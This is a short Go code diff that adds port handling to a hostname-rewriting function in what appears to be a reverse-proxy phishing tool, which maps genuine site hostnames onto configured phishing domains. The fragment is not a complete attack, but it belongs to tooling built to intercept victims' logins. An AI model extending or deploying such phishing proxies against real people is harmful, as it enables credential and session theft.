@@ -1725,6 +1725,12 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 		return hostname, false
 	}
 	prefix := ""
+	port := ""
+	if strings.Contains(hostname, ":") {
+		s := strings.Split(hostname, ":")
+		hostname = s[0]
+		port = s[1]
+	}
 	if hostname[0] == '.' {
 		prefix = "."
 		hostname = hostname[1:]
@@ -1734,6 +1740,9 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
 			if !ok {
 				continue
+			}
+			if port != "" && !strings.Contains(phishDomain, ":") {
+				phishDomain = phishDomain + ":" + port
 			}
 			for _, ph := range pl.proxyHosts {
 				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
